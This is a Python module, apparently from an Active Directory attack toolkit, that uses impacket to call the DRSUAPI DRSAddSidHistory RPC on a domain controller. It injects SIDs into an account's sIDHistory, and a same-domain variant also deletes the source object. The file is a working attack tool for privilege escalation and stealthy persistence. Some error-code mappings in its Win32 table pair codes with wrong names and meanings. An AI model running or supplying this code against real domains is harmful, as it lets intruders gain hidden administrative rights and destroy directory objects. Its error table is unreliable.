"""
DRSUAPI Module - IDL_DRSAddSidHistory (Opnum 20) Implementation

Implements the MS-DRSR DRSAddSidHistory RPC call using impacket.
This is the ONLY supported method for remotely adding SIDs to sIDHistory
from a UNIX machine without patching the DC's memory.

References:
- MS-DRSR Section 4.1.1.20: IDL_DRSAddSidHistory
- MS-DRSR Section 4.1.1.20.2: Server Behavior
- DRSUAPI Interface UUID: E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0
"""

import logging
import struct
from typing import Optional, Tuple

try:
    from impacket.dcerpc.v5 import drsuapi, transport, epm
    from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NULL
    from impacket.dcerpc.v5.dtypes import (
        DWORD, LPWSTR, ULONG, WSTR, LONG, NDRPOINTERNULL
    )
    from impacket.dcerpc.v5.rpcrt import (
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
    )
    from impacket.uuid import uuidtup_to_bin
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False


# ─── FLAGS ────────────────────────────────────────────────────────────────

DS_ADDSID_FLAG_PRIVATE_CHK_SECURE  = 0x40000000
DS_ADDSID_FLAG_PRIVATE_DEL_SRC_OBJ = 0x80000000


# ─── NDR STRUCTURES ──────────────────────────────────────────────────────

if HAS_IMPACKET:

    class WCHAR_ARRAY(NDRSTRUCT):
        """Variable-length WCHAR array for credential fields."""
        structure = (
            ('MaximumCount', ULONG),
            ('Offset', ULONG),
            ('ActualCount', ULONG),
            ('Data', ':'),
        )

    class DRS_MSG_ADDSIDREQ_V1(NDRSTRUCT):
        """
        DRS_MSG_ADDSIDREQ_V1 structure (MS-DRSR 4.1.1.20)

        typedef struct {
            DWORD Flags;
            [string] WCHAR *SrcDomain;
            [string] WCHAR *SrcPrincipal;
            [string, ptr] WCHAR *SrcDomainController;
            [range(0,256)] DWORD SrcCredsUserLength;
            [size_is(SrcCredsUserLength)] WCHAR *SrcCredsUser;
            [range(0,256)] DWORD SrcCredsDomainLength;
            [size_is(SrcCredsDomainLength)] WCHAR *SrcCredsDomain;
            [range(0,256)] DWORD SrcCredsPasswordLength;
            [size_is(SrcCredsPasswordLength)] WCHAR *SrcCredsPassword;
            [string] WCHAR *DstDomain;
            [string] WCHAR *DstPrincipal;
        } DRS_MSG_ADDSIDREQ_V1;
        """
        structure = (
            ('Flags', DWORD),
            ('SrcDomain', LPWSTR),
            ('SrcPrincipal', LPWSTR),
            ('SrcDomainController', LPWSTR),
            ('SrcCredsUserLength', DWORD),
            ('SrcCredsUser', LPWSTR),
            ('SrcCredsDomainLength', DWORD),
            ('SrcCredsDomain', LPWSTR),
            ('SrcCredsPasswordLength', DWORD),
            ('SrcCredsPassword', LPWSTR),
            ('DstDomain', LPWSTR),
            ('DstPrincipal', LPWSTR),
        )

    class DRS_MSG_ADDSIDREPLY_V1(NDRSTRUCT):
        structure = (
            ('dwWin32Error', DWORD),
        )

    class DRSAddSidHistory(NDRCALL):
        opnum = 20
        structure = (
            ('hDrs', drsuapi.DRS_HANDLE),
            ('dwInVersion', DWORD),
            ('pmsgIn', DRS_MSG_ADDSIDREQ_V1),
        )

    class DRSAddSidHistoryResponse(NDRCALL):
        structure = (
            ('pdwOutVersion', DWORD),
            ('pmsgOut', DRS_MSG_ADDSIDREPLY_V1),
            ('ErrorCode', DWORD),
        )


# ─── DRSUAPI CLIENT ──────────────────────────────────────────────────────

class DRSUAPIClient:
    """
    DRSUAPI RPC client for SID History operations.

    Uses impacket to:
    1. Connect to the DRSUAPI RPC endpoint on the DC
    2. DRSBind to establish a replication session
    3. Call IDL_DRSAddSidHistory (opnum 20)
    4. DRSUnbind to close the session
    """

    # DRS extension flag for AddSidHistory support
    DRS_EXT_ADD_SID_HISTORY = 0x00040000

    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
        if not HAS_IMPACKET:
            raise ImportError("impacket is required for DRSUAPI operations. "
                            "Install it: pip install impacket")

        self.dc_ip = dc_ip
        self.domain = domain
        self.dc_hostname = dc_hostname or dc_ip
        self._dce = None
        self._hDrs = None

    def connect(self, username: str, password: str = '', domain: str = '',
                lm_hash: str = '', nt_hash: str = '', aes_key: str = '',
                do_kerberos: bool = False) -> bool:
        """
        Connect and bind to the DRSUAPI interface on the DC.

        Returns True if connection and DRSBind succeed.
        """
        try:
            # Step 1: Resolve DRSUAPI endpoint via EPM
            logging.debug("Resolving DRSUAPI endpoint via EPM...")
            string_binding = epm.hept_map(
                self.dc_ip,
                drsuapi.MSRPC_UUID_DRSUAPI,
                protocol='ncacn_ip_tcp'
            )
            logging.debug(f"DRSUAPI endpoint: {string_binding}")

            # Step 2: Create RPC transport
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.setRemoteHost(self.dc_ip)
            rpc_transport.setRemoteName(self.dc_hostname)

            if hasattr(rpc_transport, 'set_credentials'):
                rpc_transport.set_credentials(username, password, domain,
                                             lm_hash, nt_hash, aes_key)

            if do_kerberos:
                rpc_transport.set_kerberos(True, self.dc_hostname)

            # Step 3: Get DCE/RPC object with encryption
            self._dce = rpc_transport.get_dce_rpc()
            self._dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

            if do_kerberos:
                self._dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

            # Step 4: Connect and bind
            self._dce.connect()
            self._dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
            logging.info("Connected to DRSUAPI endpoint")

            # Step 5: DRSBind
            self._hDrs = self._drs_bind()
            if self._hDrs:
                logging.info("DRSBind successful")
                return True
            else:
                logging.error("DRSBind failed")
                return False

        except Exception as e:
            logging.error(f"DRSUAPI connection failed: {e}")
            return False

    def _drs_bind(self):
        """Perform DRSBind to get a DRS handle."""
        try:
            request = drsuapi.DRSBind()
            request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID

            drs = drsuapi.DRS_EXTENSIONS_INT()
            drs['cb'] = len(drs)
            drs['dwFlags'] = (
                drsuapi.DRS_EXT_GETCHGREQ_V6 |
                drsuapi.DRS_EXT_GETCHGREPLY_V6 |
                drsuapi.DRS_EXT_GETCHGREQ_V8 |
                drsuapi.DRS_EXT_STRONG_ENCRYPTION |
                self.DRS_EXT_ADD_SID_HISTORY
            )
            drs['SiteObjGuid'] = drsuapi.NULLGUID
            drs['Pid'] = 0
            drs['dwReplEpoch'] = 0
            drs['dwFlagsExt'] = 0
            drs['ConfigObjGUID'] = drsuapi.NULLGUID
            drs['dwExtCaps'] = 0xFFFFFFFF

            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())

            resp = self._dce.request(request)
            return resp['phDrs']

        except Exception as e:
            logging.error(f"DRSBind error: {e}")
            return None

    def add_sid_history(self, src_domain: str, src_principal: str,
                        dst_domain: str, dst_principal: str,
                        src_dc: Optional[str] = None,
                        src_creds_user: str = '', src_creds_domain: str = '',
                        src_creds_password: str = '',
                        flags: int = 0) -> Tuple[bool, int, str]:
        """
        Call IDL_DRSAddSidHistory (opnum 20).

        This is the cross-forest variant (flags=0) that:
        - Looks up the source principal in the source domain
        - Copies its objectSid + sIDHistory to the destination's sIDHistory
        - Requires Domain Admin in dest, Admin in source

        Args:
            src_domain: Source domain FQDN (must be in different forest)
            src_principal: Source principal sAMAccountName
            dst_domain: Destination domain FQDN
            dst_principal: Destination principal sAMAccountName
            src_dc: Source DC hostname (optional, auto-discovered if omitted)
            src_creds_user: Username for source domain auth (optional)
            src_creds_domain: Domain for source domain auth (optional)
            src_creds_password: Password for source domain auth (optional)
            flags: DRS_ADDSID_FLAGS (0 for cross-forest, or DEL_SRC_OBJ for same-domain)

        Returns:
            Tuple of (success: bool, win32_error: int, error_message: str)
        """
        if not self._hDrs:
            return False, -1, "Not connected (DRSBind required)"

        try:
            request = DRSAddSidHistory()
            request['hDrs'] = self._hDrs
            request['dwInVersion'] = 1

            # Fill V1 structure
            request['pmsgIn']['Flags'] = flags
            request['pmsgIn']['SrcDomain'] = src_domain + '\x00'
            request['pmsgIn']['SrcPrincipal'] = src_principal + '\x00'

            if src_dc:
                request['pmsgIn']['SrcDomainController'] = src_dc + '\x00'
            else:
                request['pmsgIn']['SrcDomainController'] = NULL

            # Source credentials
            if src_creds_user:
                encoded_user = src_creds_user.encode('utf-16-le')
                request['pmsgIn']['SrcCredsUserLength'] = len(src_creds_user)
                request['pmsgIn']['SrcCredsUser'] = src_creds_user + '\x00'
            else:
                request['pmsgIn']['SrcCredsUserLength'] = 0
                request['pmsgIn']['SrcCredsUser'] = NULL

            if src_creds_domain:
                request['pmsgIn']['SrcCredsDomainLength'] = len(src_creds_domain)
                request['pmsgIn']['SrcCredsDomain'] = src_creds_domain + '\x00'
            else:
                request['pmsgIn']['SrcCredsDomainLength'] = 0
                request['pmsgIn']['SrcCredsDomain'] = NULL

            if src_creds_password:
                request['pmsgIn']['SrcCredsPasswordLength'] = len(src_creds_password)
                request['pmsgIn']['SrcCredsPassword'] = src_creds_password + '\x00'
            else:
                request['pmsgIn']['SrcCredsPasswordLength'] = 0
                request['pmsgIn']['SrcCredsPassword'] = NULL

            request['pmsgIn']['DstDomain'] = dst_domain + '\x00'
            request['pmsgIn']['DstPrincipal'] = dst_principal + '\x00'

            logging.info(f"Calling DRSAddSidHistory: {src_principal}@{src_domain} -> "
                        f"{dst_principal}@{dst_domain}")

            resp = self._dce.request(request)

            win32_error = resp['pmsgOut']['dwWin32Error']
            if win32_error == 0:
                logging.info("DRSAddSidHistory succeeded!")
                return True, 0, "Success"
            else:
                error_msg = self._translate_win32_error(win32_error)
                logging.error(f"DRSAddSidHistory failed: {error_msg} (error {win32_error})")
                return False, win32_error, error_msg

        except Exception as e:
            error_str = str(e)
            logging.error(f"DRSAddSidHistory RPC error: {error_str}")

            # Try to extract meaningful error from RPC fault
            if 'rpc_s_access_denied' in error_str.lower():
                return False, 5, "Access denied - Domain Admin privileges required"
            elif 'ERROR_DS_MUST_RUN_ON_DST_DC' in error_str:
                return False, 8547, ("Must run on destination DC - connect to the DC "
                                    "that holds the destination domain's NC")

            return False, -1, error_str

    def add_sid_history_same_domain(self, src_dn: str, dst_dn: str) -> Tuple[bool, int, str]:
        """
        Same-domain SID History injection using DS_ADDSID_FLAG_PRIVATE_DEL_SRC_OBJ.

        WARNING: This DELETES the source object and copies its SID(s) to the destination.
        Use with extreme caution. Principals are identified by DN, not sAMAccountName.

        Args:
            src_dn: DN of source principal (will be DELETED)
            dst_dn: DN of destination principal

        Returns:
            Tuple of (success, win32_error, error_message)
        """
        if not self._hDrs:
            return False, -1, "Not connected (DRSBind required)"

        try:
            request = DRSAddSidHistory()
            request['hDrs'] = self._hDrs
            request['dwInVersion'] = 1

            request['pmsgIn']['Flags'] = DS_ADDSID_FLAG_PRIVATE_DEL_SRC_OBJ
            request['pmsgIn']['SrcDomain'] = self.domain + '\x00'
            request['pmsgIn']['SrcPrincipal'] = src_dn + '\x00'
            request['pmsgIn']['SrcDomainController'] = NULL
            request['pmsgIn']['SrcCredsUserLength'] = 0
            request['pmsgIn']['SrcCredsUser'] = NULL
            request['pmsgIn']['SrcCredsDomainLength'] = 0
            request['pmsgIn']['SrcCredsDomain'] = NULL
            request['pmsgIn']['SrcCredsPasswordLength'] = 0
            request['pmsgIn']['SrcCredsPassword'] = NULL
            request['pmsgIn']['DstDomain'] = self.domain + '\x00'
            request['pmsgIn']['DstPrincipal'] = dst_dn + '\x00'

            logging.info(f"Calling DRSAddSidHistory (DEL_SRC_OBJ): {src_dn} -> {dst_dn}")
            logging.warning("This will DELETE the source object!")

            resp = self._dce.request(request)
            win32_error = resp['pmsgOut']['dwWin32Error']

            if win32_error == 0:
                logging.info("DRSAddSidHistory (DEL_SRC_OBJ) succeeded!")
                return True, 0, "Success - source object deleted"
            else:
                error_msg = self._translate_win32_error(win32_error)
                logging.error(f"DRSAddSidHistory failed: {error_msg}")
                return False, win32_error, error_msg

        except Exception as e:
            return False, -1, str(e)

    def disconnect(self):
        """Unbind and disconnect from DRSUAPI."""
        try:
            if self._hDrs and self._dce:
                drsuapi.hDRSUnbind(self._dce, self._hDrs)
                logging.debug("DRSUnbind successful")
        except Exception:
            pass

        try:
            if self._dce:
                self._dce.disconnect()
        except Exception:
            pass

        self._hDrs = None
        self._dce = None

    @staticmethod
    def _translate_win32_error(code: int) -> str:
        """Translate common Win32 error codes to human-readable messages."""
        errors = {
            0: "Success",
            5: "Access denied (ERROR_ACCESS_DENIED) - Need Domain Admin",
            8: "Not enough memory (ERROR_NOT_ENOUGH_MEMORY)",
            87: "Invalid parameter (ERROR_INVALID_PARAMETER)",
            1332: "No mapping between account names and security IDs (ERROR_NONE_MAPPED)",
            1355: "The specified domain either does not exist or could not be contacted (ERROR_NO_SUCH_DOMAIN)",
            8440: "The source domain is not in the same forest (ERROR_DS_SRC_SID_EXISTS_IN_FOREST)",
            8447: "Auditing not enabled on source or destination (ERROR_DS_MUST_BE_RUN_ON_DST_DC)",
            8490: "Source and destination must be in different forests for flags=0 (ERROR_DS_CROSS_DOM_MOVE_ERROR)",
            8505: "The source principal was not found (ERROR_DS_OBJ_NOT_FOUND)",
            8521: "Domain is not in native mode (ERROR_DS_NOT_INSTALLED)",
            8536: "Target principal already has this SID (ERROR_DS_SID_DUPLICATED)",
            8547: "Must run on destination DC (ERROR_DS_MUST_RUN_ON_DST_DC)",
            8548: "Source DC could not be contacted (ERROR_DS_CANT_FIND_DC_FOR_SRC_DOMAIN)",
            8557: "Source and destination principal type mismatch (ERROR_DS_SRC_OBJ_NOT_GROUP_OR_USER)",
            8567: "Auditing not enabled (ERROR_DS_AUDIT_NOT_ENABLED)",
        }
        return errors.get(code, f"Unknown error (code {code})")

    @staticmethod
    def check_prerequisites():
        """Check if all prerequisites for DRSUAPI are met."""
        issues = []

        if not HAS_IMPACKET:
            issues.append("impacket is not installed (pip install impacket)")

        return issues
